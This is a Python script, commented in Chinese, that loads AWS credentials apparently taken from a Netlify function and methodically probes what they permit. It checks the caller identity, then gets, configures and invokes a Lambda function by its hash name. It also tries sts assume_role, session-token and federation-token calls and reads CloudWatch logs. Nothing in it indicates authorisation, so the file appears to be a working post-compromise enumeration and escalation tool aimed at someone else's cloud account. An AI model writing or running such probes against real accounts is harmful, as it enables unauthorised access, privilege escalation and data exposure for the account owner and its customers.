# -*- coding: utf-8 -*-
"""Netlify:probe1 凭证(账户184816615194)精细权限测试:GetFunction/Invoke/GetObject 等精确操作"""
import json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
import boto3
from botocore.config import Config

aws = json.load(open(r'D:\scan\netlify_report\_aws_creds1.json'))
cfg = Config(region_name='us-east-2', retries={'max_attempts': 1}, connect_timeout=8, read_timeout=8)

def mk(service):
    return boto3.client(service, aws_access_key_id=aws['access_key'],
                        aws_secret_access_key=aws['secret_key'],
                        aws_session_token=aws['session_token'],
                        config=cfg)

# 1. 身份
try:
    r = mk('sts').get_caller_identity()
    print('Identity:', r['Arn'])
except Exception as e:
    print('sts ERR:', str(e)[:200])

# 已知函数名 hash(probe2 在另一账户的;probe1 名字未知,但 log group 前缀是 hash)
FN_HASH = '23815e7abccef425bd61a6aeea27517abd8d7d887c4dcfc9de356e2a6d8ce43a'
print()
print('=== lambda 精确操作(函数名: %s) ===' % FN_HASH[:20])
for op, kw in [
    ('get_function', {'FunctionName': FN_HASH}),
    ('get_function_configuration', {'FunctionName': FN_HASH}),
    ('invoke', {'FunctionName': FN_HASH, 'Payload': b'{}', 'LogType': 'Tail'}),
    ('list_versions_by_function', {'FunctionName': FN_HASH}),
    ('get_policy', {'FunctionName': FN_HASH}),
    ('list_tags', {'Resource': FN_HASH}),
    ('get_account_settings', {}),
]:
    try:
        r = getattr(mk('lambda'), op)(**kw)
        print('%s OK' % op, json.dumps(r)[:300])
    except Exception as e:
        print('%s ERR: %s' % (op, str(e)[:200]))

print()
print('=== s3 精确(猜测 Netlify bucket 命名模式不可行,试 us-east-2 无 bucket 名) ===')
# 用函数自身相关 bucket 名模式试探:无名单时 list 是唯一途径;已 DENY,跳过
# 试试 sts assume-role / get-session-token 是否有权限
for op, kw in [('assume_role', {'RoleArn': 'arn:aws:iam::184816615194:role/aws-lambda-execute', 'RoleSessionName': 'x'}),
               ('get_session_token', {}),
               ('get_federation_token', {'Name': 'x'})]:
    try:
        r = getattr(mk('sts'), op)(**kw)
        print('%s OK' % op, str(r)[:200])
    except Exception as e:
        print('%s ERR: %s' % (op, str(e)[:200]))

print()
print('=== cloudwatch logs 精确 ===')
try:
    r = mk('logs').describe_log_streams(logGroupName='/aws/lambda/' + FN_HASH)
    print('describe_log_streams OK:', len(r.get('logStreams', [])))
except Exception as e:
    print('describe_log_streams ERR:', str(e)[:150])
try:
    r = mk('logs').filter_log_events(logGroupName='/aws/lambda/' + FN_HASH)
    print('filter_log_events OK')
except Exception as e:
    print('filter_log_events ERR:', str(e)[:150])
